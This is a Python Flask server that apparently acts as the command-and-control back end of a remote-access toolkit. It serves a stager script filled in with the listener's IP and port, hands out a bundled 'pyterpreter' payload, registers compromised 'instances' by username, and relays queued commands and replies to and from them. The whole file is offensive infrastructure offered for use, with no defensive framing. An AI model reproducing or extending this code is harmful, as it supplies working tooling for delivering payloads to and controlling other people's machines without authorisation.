from flask import Flask, send_from_directory, redirect, request
import pyckager
from threading import Thread
from queue import Empty
import os
import logging

from core.message import Message

import instance_manager

LOCAL_IP = '127.0.0.1'
PORT = 1337

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.level = logging.WARNING


def get_available_scripts():
    scripts = []
    for file in os.listdir('resources'):
        path = os.path.join('resources', file)
        if os.path.isfile(path) and file != 'stager.sh':
            scripts.append(path)
    return scripts


def get_file_with_subs(file, subs: dict):
    with open(f'resources/{file}') as fh:
        data = fh.read()
    for key, value in subs.items():
        data = data.replace(f'<{key}>', value)
    return data


@app.route('/')
def stager():
    return get_file_with_subs('stager.py', {
        'LOCAL_IP': LOCAL_IP,
        'WEBSERVER_PORT': '1337'
    })


@app.route('/resources/<resource>')
def get_resource(resource):
    if resource == 'pyterpreter.py':
        return pyckager.process_packages(['pyterpreter', 'core'])

    elif resource == 'stager.py':
        return stager()

    return send_from_directory('resources', resource)


@app.route('/instances', methods=['POST'])
def create_instance():
    username = request.data.decode()
    print(f'created with username {username}')
    instance = instance_manager.create_instance(username)
    return instance.instance_id


@app.route('/instances/<instance_id>', methods=['GET', 'POST'])
def messaging(instance_id):
    instance = instance_manager.get_by_id(instance_id)
    if instance is None:
        return 'Not Found', 404
    if request.method == 'POST':
        message = Message.from_string(request.data.decode())
        instance.messages_received_put(message)
        return ''
    else:
        messages = []
        try:
            message = instance.messages_to_send.get_nowait()
            messages.append(message)
        except Empty:
            pass
        return '\n'.join([message.to_string() for message in messages])


def start(blocking=False):
    if not blocking:
        Thread(target=start, args=(True,), daemon=True).start()
    else:
        app.run('0.0.0.0', PORT, debug=False)
